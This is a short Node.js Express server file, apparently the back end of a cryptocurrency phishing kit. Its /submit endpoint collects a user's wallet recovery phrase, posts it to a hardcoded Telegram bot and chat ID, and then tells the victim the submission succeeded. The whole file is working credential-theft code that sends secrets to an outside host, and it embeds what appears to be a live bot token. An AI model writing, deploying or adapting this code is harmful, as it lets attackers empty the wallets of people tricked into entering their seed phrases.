const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch'); // Import node-fetch for older Node.js versions

const app = express();
const PORT = 3000;

// Telegram Bot Token and Chat ID
const telegramBotToken = '8012898137:AAHrkbdZwW7a3qIinIkPq2pgHrNN1pOX_-A';
const chatId = '1353449624';

app.use(bodyParser.json());
app.use(express.static('public')); // Serve static files from 'public' directory

app.post('/submit', async (req, res) => {
    const { recoveryPhrase } = req.body;

    if (!recoveryPhrase) {
        return res.status(400).json({ message: 'Recovery phrase is required.' });
    }

    try {
        const response = await fetch(
            `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `New Recovery Phrase: ${recoveryPhrase}`,
                }),
            }
        );

        if (!response.ok) {
            throw new Error('Failed to send message to Telegram');
        }

        res.status(200).json({ message: 'Recovery phrase submitted successfully!' });
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
        res.status(500).json({ message: 'Failed to submit recovery phrase.' });
    }
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
